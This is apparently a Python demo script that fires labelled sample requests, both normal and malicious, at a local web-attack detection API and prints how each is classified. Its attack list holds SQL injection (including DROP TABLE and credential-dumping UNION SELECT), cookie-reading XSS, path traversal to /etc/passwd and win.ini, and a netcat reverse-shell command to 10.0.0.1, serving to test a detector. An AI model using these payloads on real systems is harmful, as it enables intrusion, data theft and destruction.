"""
Live attack demo — fires 13 requests at the API and shows results.
"""
import requests
import json
import time

API = "http://127.0.0.1:5000/analyze"

attacks = [
    # Normal traffic
    {"name": "Normal browsing",
     "url": "https://shop.example.com/products?category=Electronics",
     "params": "category=Electronics",
     "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0",
     "method": "GET"},

    {"name": "Normal search",
     "url": "https://shop.example.com/search?q=wireless+headphones",
     "params": "q=wireless+headphones",
     "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0",
     "method": "GET"},

    # SQL Injection
    {"name": "SQLi - OR 1=1",
     "url": "https://shop.example.com/login?user=admin' OR 1=1--",
     "params": "user=admin' OR 1=1--",
     "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0",
     "method": "POST"},

    {"name": "SQLi - UNION SELECT",
     "url": "https://shop.example.com/products?id=1 UNION SELECT null,username,password FROM users--",
     "params": "id=1 UNION SELECT null,username,password FROM users--",
     "headers": "Host: shop.example.com\r\nUser-Agent: sqlmap/1.7",
     "method": "GET"},

    {"name": "SQLi - DROP TABLE",
     "url": "https://shop.example.com/api/v1/items?id=1; DROP TABLE users;--",
     "params": "id=1; DROP TABLE users;--",
     "headers": "Host: shop.example.com",
     "method": "GET"},

    # XSS
    {"name": "XSS - script alert",
     "url": "https://shop.example.com/search?q=<script>alert(document.cookie)</script>",
     "params": "q=<script>alert(document.cookie)</script>",
     "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0",
     "method": "GET"},

    {"name": "XSS - img onerror",
     "url": "https://shop.example.com/profile?name=<img src=x onerror=alert(1)>",
     "params": "name=<img src=x onerror=alert(1)>",
     "headers": "Host: shop.example.com",
     "method": "GET"},

    # Command Injection
    {"name": "CMDi - cat passwd",
     "url": "https://shop.example.com/ping?host=127.0.0.1; cat /etc/passwd",
     "params": "host=127.0.0.1; cat /etc/passwd",
     "headers": "Host: shop.example.com",
     "method": "GET"},

    {"name": "CMDi - reverse shell",
     "url": "https://shop.example.com/exec?cmd=test|nc -e /bin/sh 10.0.0.1 4444",
     "params": "cmd=test|nc -e /bin/sh 10.0.0.1 4444",
     "headers": "Host: shop.example.com",
     "method": "POST"},

    # Path Traversal
    {"name": "Traversal - etc/passwd",
     "url": "https://shop.example.com/download?file=../../../../etc/passwd",
     "params": "file=../../../../etc/passwd",
     "headers": "Host: shop.example.com",
     "method": "GET"},

    {"name": "Traversal - Windows",
     "url": "https://shop.example.com/read?file=..\\..\\..\\windows\\win.ini",
     "params": "file=..\\..\\..\\windows\\win.ini",
     "headers": "Host: shop.example.com",
     "method": "GET"},

    # More normal
    {"name": "Normal API call",
     "url": "https://api.example.com/v2/users?page=3&sort=name&order=asc",
     "params": "page=3&sort=name&order=asc",
     "headers": "Host: api.example.com\r\nAuthorization: Bearer abc123",
     "method": "GET"},

    {"name": "Normal checkout",
     "url": "https://shop.example.com/checkout?step=payment",
     "params": "step=payment",
     "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0",
     "method": "POST"},
]

print("=" * 70)
print("  LIVE ATTACK DEMO - Sending requests to detection engine")
print("=" * 70)
print()

for i, atk in enumerate(attacks):
    payload = {k: atk[k] for k in ("url", "params", "headers", "method")}
    r = requests.post(API, json=payload)
    result = r.json()

    label = result.get("label", "unknown")
    conf = result.get("confidence", 0)
    stage = result.get("stage", "-")
    mal = result.get("is_malicious", False)

    icon = "ATTACK" if mal else "CLEAN "
    name = atk["name"]

    print("  [%2d] %s | %-30s -> %-22s %5.1f%%  (%s)" %
          (i + 1, icon, name, label, conf, stage))
    time.sleep(0.3)

print()
print("=" * 70)
print("  All requests sent! Dashboard: http://127.0.0.1:5000/")
print("=" * 70)
